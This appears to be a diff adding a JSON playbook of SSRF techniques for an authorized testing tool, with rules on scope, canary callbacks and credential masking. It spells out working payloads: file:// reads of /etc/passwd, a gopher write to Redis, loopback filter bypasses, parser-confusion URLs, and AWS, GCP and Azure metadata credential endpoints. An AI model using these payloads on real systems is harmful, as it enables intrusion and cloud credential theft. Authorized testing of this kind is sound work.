@@ -1,0 +1,179 @@
+{
+  "corpus": "SSRF",
+  "organ": "ssrf-playbook",
+  "vuln_class": "server_side_request_forgery",
+  "corpus_version": "1.0.0",
+  "house_rules": [
+    "Every proof routes through the operator's declared canary collector (scope.csv class canary, http_probe with canary=True) - a DNS log or HTTP hit on a third-party service is gossip, not channel proof (organ doctrine).",
+    "Payloads below are canonical forms from the public record, attributed per entry.",
+    "Egress toward cloud metadata endpoints is an authorized-only action: the scope row must cover the HOST the request actually lands on, not just the URL the parameter names.",
+    "failure_modes are mandatory reading BEFORE closing a hypothesis as negative: a bypass that failed for a listed reason leaves the filter untested, not effective."
+  ],
+  "entries": [
+    {
+      "id": "SSRF-001",
+      "technique": "file:// scheme read",
+      "prerequisites": ["sink fetches attacker-named URLs with a permissive scheme handler"],
+      "probe": "file:///etc/passwd (linux) / file:///c:/windows/win.ini (windows)",
+      "oracle": "file contents in the response body or a body-hash differential vs a nonexistent path",
+      "failure_modes": [
+        "scheme allowlist (http/https only) - the refusal itself is a FACT about the sink's validation posture",
+        "response body never surfaced - pair with a canary-readable transform (error text, size oracle) instead of assuming failure"
+      ],
+      "source": {
+        "credit": "canonical",
+        "title": "PortSwigger Web Security Academy - SSRF",
+        "url": "https://portswigger.net/web-security/ssrf"
+      }
+    },
+    {
+      "id": "SSRF-002",
+      "technique": "gopher:// arbitrary TCP request forging",
+      "prerequisites": ["gopher handler reachable in the sink's URL stack", "internal TCP service (Redis/MySQL/SMTP) in egress reach"],
+      "probe": "gopher://127.0.0.1:6379/_SET%20ssrf%20proof%0d%0aQUIT%0d%0a (byte-crafted request in the path)",
+      "oracle": "the internal service state changes / answers - Redis MONITOR or the service's observable side effect is the proof; bounded to a self-owned proof key",
+      "failure_modes": [
+        "gopher stripped by URL validation - try gophers:// or the secondary handlers (dict://, ftp://) before closing",
+        "egress firewall drops the port regardless of scheme",
+        "the proof must be reversible (DEL the proof key) - never leave state on client infrastructure"
+      ],
+      "source": {
+        "credit": "Orange Tsai",
+        "title": "A New Era of SSRF (gopher/protocol abuse)",
+        "url": "https://www.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html"
+      }
+    },
+    {
+      "id": "SSRF-003",
+      "technique": "alternate IP notations against string filters",
+      "prerequisites": ["filter matches literal 127.0.0.1 / 169.254.169.254 strings"],
+      "probe": "http://2130706433/ (decimal) / http://0x7f000001/ (hex) / http://0177.000.000.001/ (octal) / http://127.1/ (short form)",
+      "oracle": "request lands on the loopback/private address the filter tried to block - canary callback or response differential proves resolution",
+      "failure_modes": [
+        "sink normalizes the URL before validation (modern parsers resolve then check) - the class is dead at THAT sink; verify with the exact sink version, libraries differ",
+        "DNS-layer resolution of the odd form fails on some stacks - each variant is a separate FACT record, not one class"
+      ],
+      "source": {
+        "credit": "canonical SSRF filter bypass set",
+        "title": "PortSwigger Web Security Academy - SSRF (bypassing filters)",
+        "url": "https://portswigger.net/web-security/ssrf"
+      }
+    },
+    {
+      "id": "SSRF-004",
+      "technique": "redirect-based pivot (validator checks first hop only)",
+      "prerequisites": ["attacker-controlled URL that can 302 to an internal target", "sink follows redirects"],
+      "probe": "https://{{operator-host}}/redirect?to=http://169.254.169.254/ (302 to the internal address)",
+      "oracle": "internal response body/hash surfaces via the followed hop; the redirect host must be operator-owned (scope row canary or in_scope)",
+      "failure_modes": [
+        "validator re-checks EVERY hop - per-hop validation kills the pivot",
+        "redirect protocol restrictions (https->http downgrades refused)",
+        "metadata endpoints answer non-200 to default UA - read the class-specific entry (SSRF-006..008) for the required headers"
+      ],
+      "source": {
+        "credit": "canonical",
+        "title": "PortSwigger Web Security Academy - SSRF (bypassing filters via redirects)",
+        "url": "https://portswigger.net/web-security/ssrf"
+      }
+    },
+    {
+      "id": "SSRF-005",
+      "technique": "DNS rebinding (validate-then-resolve gap)",
+      "prerequisites": ["sink resolves the hostname TWICE (once to validate, once to fetch)", "attacker-controlled DNS with low TTL"],
+      "probe": "http://{{rebind-domain}}/ - first resolution answers a public IP, second answers 127.0.0.1",
+      "oracle": "the fetch lands on the internal address after the validation pass; proof via canary callback from the internal hop",
+      "failure_modes": [
+        "sink pins the resolved IP after validation (resolve-once) - the gap is closed at that sink",
+        "DNS caching between the two resolutions - TTL games need the cache window measured, not assumed",
+        "operator needs a rebinding-capable DNS setup - scope.csv canary row for the DNS host, never an unlisted third-party rebinder"
+      ],
+      "source": {
+        "credit": "canonical technique class",
+        "title": "PortSwigger Web Security Academy - SSRF (DNS rebinding class)",
+        "url": "https://portswigger.net/web-security/ssrf"
+      }
+    },
+    {
+      "id": "SSRF-006",
+      "technique": "AWS EC2 instance metadata (IMDSv1)",
+      "prerequisites": ["SSRF egress to 169.254.169.254 from an AWS workload", "IMDSv1 still enabled"],
+      "probe": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "oracle": "role list, then per-role credential document - names/key prefixes visible in the response; NEVER copy full credentials into the ledger (mask at first 8 chars, artifact under engagements/, report states the class)",
+      "failure_modes": [
+        "IMDSv2 enforced: GET returns 401 - token flow (PUT with X-aws-ec2-metadata-token-ttl-seconds) must be reachable THROUGH the SSRF (PUT-capable sinks only); if not, the class is closed and the hardening is a positive FACT",
+        "hop-limit 1 blocks container/pod egress paths",
+        "response template strips keys - use the size/hash oracle instead"
+      ],
+      "source": {
+        "credit": "AWS documentation (instance metadata service)",
+        "title": "AWS EC2 User Guide - Instance metadata and user data",
+        "url": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
+      }
+    },
+    {
+      "id": "SSRF-007",
+      "technique": "GCP compute metadata",
+      "prerequisites": ["egress to metadata.google.internal (or 169.254.169.254) from a GCP workload", "sink can send the required header"],
+      "probe": "http://metadata.google.internal/computeMetadata/v1/ with header Metadata-Flavor: Google",
+      "oracle": "200 + project metadata tree; the header requirement is itself the detection differential (bare GET = 403/redirect)",
+      "failure_modes": [
+        "sink cannot set arbitrary headers on the fetched request - header injection via the URL is a separate hypothesis, not assumed",
+        "workload identity hardened scopes - tokens listed but cloud-platform scope absent limits impact; record as scope FACT"
+      ],
+      "source": {
+        "credit": "Google Cloud metadata endpoint documentation",
+        "title": "GCP metadata server conventions (Metadata-Flavor header)",
+        "url": "https://cloud.google.com/compute/docs/metadata/overview"
+      }
+    },
+    {
+      "id": "SSRF-008",
+      "technique": "Azure instance metadata (IMDS)",
+      "prerequisites": ["egress to 169.254.169.254 from an Azure workload", "Metadata: true header sendable"],
+      "probe": "http://169.254.169.254/metadata/instance?api-version=2021-12-13 with header Metadata: true",
+      "oracle": "JSON instance document (compute/network/identity blocks) in the response",
+      "failure_modes": [
+        "api-version parameter mandatory - a bare GET is refused, which is itself the Azure fingerprint",
+        "managed identity absent - identity block empty; impact bounded to information disclosure"
+      ],
+      "source": {
+        "credit": "Microsoft Azure documentation",
+        "title": "Azure IMDS - retrieve instance metadata",
+        "url": "https://learn.microsoft.com/azure/virtual-machines/instance-metadata-service"
+      }
+    },
+    {
+      "id": "SSRF-009",
+      "technique": "URL parser confusion (userinfo/fragment/backslash)",
+      "prerequisites": ["two components parse the SAME URL differently (validator vs fetcher) - the parser-chain map first"],
+      "probe": "http://evil.example#@{{internal-host}}/ / http://{{internal-host}}@evil.example/ / http://evil.example\\@{{internal-host}}/",
+      "oracle": "validator reads one host, fetcher reads the other - request lands on the host the validator missed; canary callback from the fetch proves which parser won",
+      "failure_modes": [
+        "single parser does validate+fetch (no seam) - URL confusion needs TWO disagreeing components, same law as desync-hunter's seams",
+        "WHATWG-compliant parsers on both sides - confusion surface shrank to backslash/encoded-slash cases; test the exact library pair, ledger versions"
+      ],
+      "source": {
+        "credit": "Orange Tsai (parser-differential SSRF discipline)",
+        "title": "A New Era of SSRF",
+        "url": "https://www.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html"
+      }
+    },
+    {
+      "id": "SSRF-010",
+      "technique": "operator canary channel proof (the house entry)",
+      "prerequisites": ["scope.csv row class canary for the operator collector (with artifact)", "http_probe(canary=True) route"],
+      "probe": "payload URL host pointing at the declared collector: https://{{collector}}/collect/{{marker}} - the SSRF itself places the URL in the sink parameter",
+      "oracle": "a GET poll on the collector (canary mode: GET-only, no query string, bounded path) returns the marker - the CHANNEL is proven end-to-end: server-side request -> collector -> operator poll, every hop ledgered CANARY",
+      "failure_modes": [
+        "the canary gate refuses the URL (query string or path slack) - that refusal is doctrine working, re-shape the payload within the channel rules",
+        "no callback after differential says the fetch happened - egress filtering between sink and collector; try the redirect entry (SSRF-004) as the delivery path",
+        "a third-party interaction host responding instead of the operator collector = gossip, never a CONFIRMED channel record"
+      ],
+      "source": {
+        "credit": "house doctrine (ssrf-playbook + arsenal scope gate v1.7.0)",
+        "title": "ssrf-playbook references/canary-callback.md; arsenal scope_gate.py check_canary",
+        "url": "https://portswigger.net/web-security/ssrf"
+      }
+    }
+  ]
+}
